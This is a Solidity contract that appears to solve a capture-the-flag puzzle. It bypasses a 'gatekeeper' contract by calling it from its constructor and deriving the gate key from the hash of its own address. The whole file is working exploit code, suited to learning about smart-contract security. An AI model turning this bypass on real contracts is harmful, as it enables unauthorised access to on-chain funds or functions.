// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}
contract GatekeeperTwoAttack {
    IGatekeeper public immutable gatekeeper;

    constructor(address _gatekeeper) {
        gatekeeper = IGatekeeper(_gatekeeper);
        attack();
    }

    function attack() public {
       // 首先计算出 uint64 _gateKey
       uint64 _gateKey = ~uint64(bytes8(keccak256(abi.encodePacked(address(this)))));

      (bool ok,) = address(gatekeeper).call(abi.encodeWithSignature("enter(bytes8)", bytes8(_gateKey)));
      require(ok, "call failed");

    }

}